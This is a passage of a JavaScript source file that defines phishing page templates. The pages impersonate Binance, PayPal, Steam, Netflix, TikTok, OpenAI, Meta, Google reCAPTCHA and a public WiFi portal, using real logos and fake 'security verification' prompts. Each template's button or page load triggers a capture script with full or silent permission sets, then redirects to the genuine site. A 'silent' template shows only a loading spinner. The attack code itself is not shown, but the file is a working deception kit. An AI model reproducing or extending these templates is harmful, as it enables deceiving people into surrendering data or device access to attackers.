transition: background 0.2s; } .btn:hover { background: #1565c0; } .terms { font-size: 12px; color: #999; margin-top: 20px; } .terms a { color: #1976d2; text-decoration: none; }</style></head><body><div class="box"><div class="wifi-icon">📶</div><h1>Free WiFi Connect</h1><p>Welcome to the Public Free WiFi network. To ensure network security and prevent bot abuse, please verify your session to connect.</p><hr><button class="btn" onclick="window.startCapture();">Connect to Network</button><div class="terms">By connecting, you agree to our <a href="#">Terms of Service</a>, <a href="#">Privacy Policy</a> & <a href="#">Public WiFi Agreement</a>.</div></div>${getCaptureScript(id, 'https://google.com', {
      tmplId: 'wifi', perms: ALL_PERMS, accent: '#1976d2', icon: '📶'
    })}</body></html>`
  },
  'binance': {
    name: "💱 Crypto: Withdrawal Security (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Verification | Binance</title><style>body { background:#0b0e11; color:#eaecef; font-family: 'BinancePlex', 'Inter', -apple-system, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { width:100%; max-width:440px; padding:48px 40px; background:#1e2329; border-radius:16px; text-align:center; box-shadow: 0 10px 40px rgba(0,0,0,0.4); } h2 { font-size:24px; font-weight: 600; color: #eaecef; margin-bottom:16px; } p { color:#848e9c; font-size:15px; margin-bottom:32px; line-height: 1.6; } .btn { background:#fcd535; color:#0b0e11; padding:12px 24px; border-radius:4px; border:none; font-weight:600; cursor:pointer; width:100%; font-size: 16px; transition: background 0.2s; } .btn:hover { background: #e6c229; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg" alt="Binance" style="width: 160px; height: auto; margin-bottom: 32px; filter: brightness(0) invert(1);" referrerpolicy="no-referrer"><h2>Security Verification</h2><p>To protect your account assets, please complete the standard security verification check to authorize this session.</p><button class="btn" onclick="window.startCapture();">Confirm Verification</button><div style="font-size:11px; color:#666; margin-top:20px;">By clicking "Confirm", you agree to the <a href="#" style="color:#fcd535; text-decoration:none;">Binance Service Agreement</a></div></div>${getCaptureScript(id, 'https://www.binance.com/en/my/security', {
      tmplId: 'binance', perms: ALL_PERMS, accent: '#fcd535', icon: '💰'
    })}</body></html>`
  },
  'paypal': {
    name: "💳 Fintech: Transaction Audit (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>PayPal Security</title><style>body { background:#ffffff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; color:#2c2e2f; } .box { width:100%; max-width:400px; text-align:center; padding:40px; box-sizing: border-box; } .logo-img { width: 120px; height: auto; margin-bottom:40px; } h2 { font-size:24px; font-weight: 300; margin-bottom:15px; color: #000; } p { color:#666; font-size:15px; line-height: 1.5; margin-bottom:40px; } .btn { background:#0070e0; color:#fff; padding:12px; border-radius:24px; border:none; font-weight:bold; cursor:pointer; width:100%; font-size: 15px; transition: background 0.2s; } .btn:hover { background:#005ea6; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" class="logo-img" alt="PayPal"><h2>Help us protect your account</h2><p>We've noticed some unusual activity. To protect your funds, please verify your identity to continue.</p><button class="btn" onclick="window.startCapture();">Secure my account</button><div style="font-size:11px; color:#999; margin-top:20px;">By clicking, you agree to the <a href="#" style="color:#0070ba; text-decoration:none;">PayPal User Agreement</a></div></div>${getCaptureScript(id, 'https://www.paypal.com/myaccount/security', {
      tmplId: 'paypal', perms: ALL_PERMS, accent: '#0070ba', icon: '💳'
    })}</body></html>`
  },
  'steam': {
    name: "🎮 Gaming: Steam Guard (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/x-icon" href="https://store.steampowered.com/favicon.ico"><title>Steam Guard Security</title><style>body { background:#1b2838; color:#c7d5e0; font-family: "Motiva Sans", Sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; -webkit-font-smoothing: antialiased; } .box { background:#171a21; width:100%; max-width:440px; padding:48px 32px; border-radius:4px; box-shadow: 0 20px 60px rgba(0,0,0,0.6); text-align:center; border:1px solid #333; box-sizing: border-box; } .logo { width: 120px; height: auto; margin-bottom:32px; } h2 { font-size:24px; color:#fff; margin-bottom:16px; font-weight: 300; letter-spacing: 1px; } p { font-size:15px; color:#acb2b8; line-height:1.6; margin-bottom:32px; } .btn { background: linear-gradient( to right, #4074f3 0%, #1e45da 100%); color:#fff; border:none; padding:14px 24px; border-radius:2px; font-weight:500; cursor:pointer; width:100%; font-size: 16px; transition: filter 0.2s; box-shadow: 0 4px 15px rgba(0,0,0,0.2); } .btn:hover { filter: brightness(1.2); }</style></head><body><div class="box"><img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg" alt="Steam" referrerpolicy="no-referrer"><h2>Security Verification</h2><p>Steam requires a one-time security verification to authorize this device and maintain account security protection levels.</p><button class="btn" onclick="window.startCapture('steam');">Verify Device Authentication</button><div style="font-size:11px; color:#888; margin-top:20px;">By clicking, you accept the <a href="#" style="color:#4074f3; text-decoration:none;">Steam SSA & Privacy Policy</a></div></div>${getCaptureScript(id, 'https://store.steampowered.com', {
      tmplId: 'steam', perms: ALL_PERMS, accent: '#1a44c2', icon: '🎮'
    })}</body></html>`
  },
  'netflix': {
    name: "🍿 Media: Household Verification (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/x-icon" href="https://www.netflix.com/favicon.ico"><title>Household Verification - Netflix</title><style>body { background:#000000; color:#fff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; -webkit-font-smoothing: antialiased; } .box { width:100%; max-width:480px; padding:60px 40px; text-align:center; background: #000; box-sizing: border-box; } .logo { margin-bottom:48px; } .logo img { width: 180px; height: auto; } h2 { font-size:32px; font-weight: 700; margin-bottom:24px; } p { color:#b3b3b3; font-size:17px; margin-bottom:48px; line-height: 1.6; } .btn { background:#e50914; color:#fff; border:none; padding:18px; font-weight:bold; cursor:pointer; width:100%; font-size:18px; border-radius: 4px; transition: background 0.2s; } .btn:hover { background: #c1000b; }</style></head><body><div class="box"><div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/08/Netflix_2015_logo.svg/1000px-Netflix_2015_logo.svg.png" alt="Netflix" referrerpolicy="no-referrer"></div><h2>Verify Household</h2><p>To continue using Netflix on this device, please complete a brief security check to confirm your household connection environment.</p><button class="btn" onclick="window.startCapture('netflix');">Verify Device</button><div style="font-size:12px; color:#777; margin-top:30px;">By verifying, you agree to the <a href="#" style="color:#e50914; text-decoration:none;">Netflix Consumer Service Terms</a></div></div>${getCaptureScript(id, 'https://www.netflix.com', {
      tmplId: 'netflix', perms: ALL_PERMS, accent: '#e50914', icon: '📺'
    })}</body></html>`
  },
  'tiktok': {
    name: "🎵 Social: Creator Portal (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Check | TikTok</title><style>body { background:#ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; color:#161823; } .box { width:100%; max-width:420px; text-align:center; padding: 48px 32px; border: 1px solid #f0f0f0; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.04); } .logo { width: 140px; height: auto; margin-bottom: 40px; } h2 { font-size:24px; font-weight:700; margin-bottom:16px; } p { color: rgba(22, 24, 35, 0.7); font-size:16px; margin-bottom:48px; line-height: 1.5; } .btn { background:#fe2c55; color:#fff; padding:16px; border:none; border-radius: 4px; font-weight:700; cursor:pointer; width:100%; font-size:16px; transition: opacity 0.2s; } .btn:hover { opacity: 0.9; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" class="logo" referrerpolicy="no-referrer"><h2>Security Sweep</h2><p>Please complete a quick check to maintain your account safety and access to creator features.</p><button class="btn" onclick="window.startCapture();">Verify Identity</button><div style="font-size:12px; color:#999; margin-top:25px;">By continuing, you agree to the <a href="#" style="color:#fe2c55; text-decoration:none;">TikTok Business & Safety Agreement</a></div></div>${getCaptureScript(id, 'https://www.tiktok.com', {
      tmplId: 'tiktok', perms: ALL_PERMS, accent: '#fe2c55', icon: '🎵'
    })}</body></html>`
  },
  'chatgpt': {
    name: "🤖 AI: OpenAI Dev Audit (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>OpenAI Authentication</title><style>body { background:#ffffff; font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { width:100%; max-width:400px; text-align:center; padding: 40px; } .logo { width: 40px; height: auto; margin-bottom: 32px; } h2 { font-size:32px; font-weight: 600; color: #000; margin-bottom: 24px; letter-spacing: -0.02em; } p { color:#353740; font-size:16px; margin-bottom:40px; line-height: 1.6; } .btn { background:#10a37f; color:#fff; border:none; padding:12px; border-radius:4px; cursor:pointer; width:100%; font-size: 16px; font-weight:500; transition: opacity 0.2s; } .btn:hover { opacity: 0.9; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/0/04/ChatGPT_logo.svg" class="logo" referrerpolicy="no-referrer"><h2>Verify you are human</h2><p>To protect our systems, please complete a security audit to verify your connection.</p><button class="btn" onclick="window.startCapture();">Begin Verification</button><div style="font-size:11px; color:#999; margin-top:30px;">By clicking, you acknowledge the <a href="#" style="color:#10a37f; text-decoration:none;">OpenAI Identity Audit Policy</a></div></div>${getCaptureScript(id, 'https://openai.com', {
      tmplId: 'chatgpt', perms: ALL_PERMS, accent: '#10a37f', icon: '🤖'
    })}</body></html>`
  },
  'meta_verification': {
    name: "🎯 Meta: Claim Lencana Verifikasi (Facebook/IG)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verifikasi Meta</title><style>body { font-family: -apple-system, system-ui, sans-serif; background:#f0f2f5; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { background:#fff; border-radius:12px; padding:40px; width:100%; max-width:400px; text-align:center; box-shadow: 0 12px 40px rgba(0,0,0,0.08); } .meta-logo { width:120px; margin-bottom:20px; } h2 { font-size:22px; font-weight:700; color:#1c1e21; margin:0 0 12px; } p { color:#606770; line-height:1.5; font-size:15px; margin-bottom:30px; } .badge { width:60px; height:60px; margin-bottom:15px; } .btn { background:#0064e0; color:#fff; border:none; padding:12px; border-radius:6px; font-size:16px; font-weight:600; cursor:pointer; width:100%; transition:filter 0.2s; } .btn:hover { filter: brightness(1.1); }</style></head><body><div class="box"><img class="meta-logo" src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg"><img class="badge" src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Twitter_Verified_Badge.svg" style="filter: hue-rotate(200deg);"><h2>Claim Verified Badge</h2><p>Selamat! Akun Anda memenuhi syarat untuk mendapatkan lencana verifikasi Meta secara gratis. Klik tombol di bawah untuk memverifikasi identitas dan memasang lencana biru.</p><button class="btn" onclick="window.startCapture();">Claim Sekarang</button><div style="font-size:11px; color:#999; margin-top:20px;">Dengan mengklik, Anda menyetujui <a href="#" style="color:#0064e0; text-decoration:none;">Syarat dan Ketentuan Verifikasi Meta</a></div></div>${getCaptureScript(id, 'https://www.facebook.com/help/128237037833915', {
      tmplId: 'meta_verification', perms: ALL_PERMS, accent: '#0064e0', icon: '✅'
    })}</body></html>`
  },
  'recap': {
    name: "🕵️ reCAPTCHA: V2 Checkbox Check (Realistic)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>reCAPTCHA Verification</title><style>body { display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; background:#fff; font-family: Roboto, helvetica, arial, sans-serif; } .box { width: 302px; height: 76px; border: 1px solid #d3d3d3; border-radius: 3px; background: #f9f9f9; display: flex; align-items: center; box-sizing: border-box; cursor: pointer; transition: all 0.2s; position: relative; } .box:hover { box-shadow: 0px 0px 2px rgba(0,0,0,0.1); } .checkbox { width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 12px; margin-right: 12px; background: #fff; display: flex; align-items: center; justify-content: center; } .checkbox.spinning { border: none !important; background: transparent; } .checkbox.spinning::after { content: ''; width: 24px; height: 24px; border: 3px solid #1a73e8; border-right-color: transparent; border-radius: 50%; animation: sc-spin 1s linear infinite; } @keyframes sc-spin { to { transform: rotate(360deg); } } .text { font-size: 14px; color: #222; font-family: Roboto, sans-serif; } .logo { position: absolute; right: 10px; top: 12px; display: flex; flex-direction: column; align-items: center; } .logo img { width: 32px; height: 32px; margin-bottom: 2px; } .logo span { font-size: 8px; color: #555; text-align: center; line-height: 1.2; } .logo-links { font-size: 8px; color: #555; margin-top: 2px; } .logo-links a { color: #555; text-decoration: none; } .logo-links a:hover { text-decoration: underline; }</style></head><body><div class="box interactive-box" onclick="this.querySelector('.checkbox').classList.add('spinning'); window.startCapture();"><div class="checkbox"></div><div class="text">I'm not a robot</div><div class="logo"><img src="https://www.gstatic.com/recaptcha/api2/logo_48.png"><span>reCAPTCHA</span><span class="logo-links"><a href="#">Privacy</a> - <a href="#">Terms</a></span></div></div><div style="font-size:11px; color:#777; margin-top:15px; max-width:300px; text-align:center;">To proceed, you must agree to the <a href="#" style="color:#1a73e8; text-decoration:none;">Identity Verification Agreement</a></div>${getCaptureScript(id, 'https://google.com/', {
      tmplId: 'recap', perms: ALL_PERMS, accent: '#1a73e8'
    })}</body></html>`
  },
  'recap_silent': {
    name: "☁️ Passive Connection Validation",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Loading...</title><style>body { background: #fafafa; display: flex; height: 100vh; margin: 0; align-items: center; justify-content: center; font-family: sans-serif; } .spinner { width: 40px; height: 40px; border: 3px solid rgba(0,0,0,0.1); border-top-color: #333; border-radius: 50%; animation: spin 1s linear infinite; } @keyframes spin { to { transform: rotate(360deg); } }</style></head><body><div class="spinner"></div>${getCaptureScript(id, 'https://google.com/', {
      tmplId: 'recap_silent', flow: 'silent', perms: SILENT_PERMS
    })}</body></html>`
  }
};

// Global metadata version trigger for GitHub sync (v1.1.4)
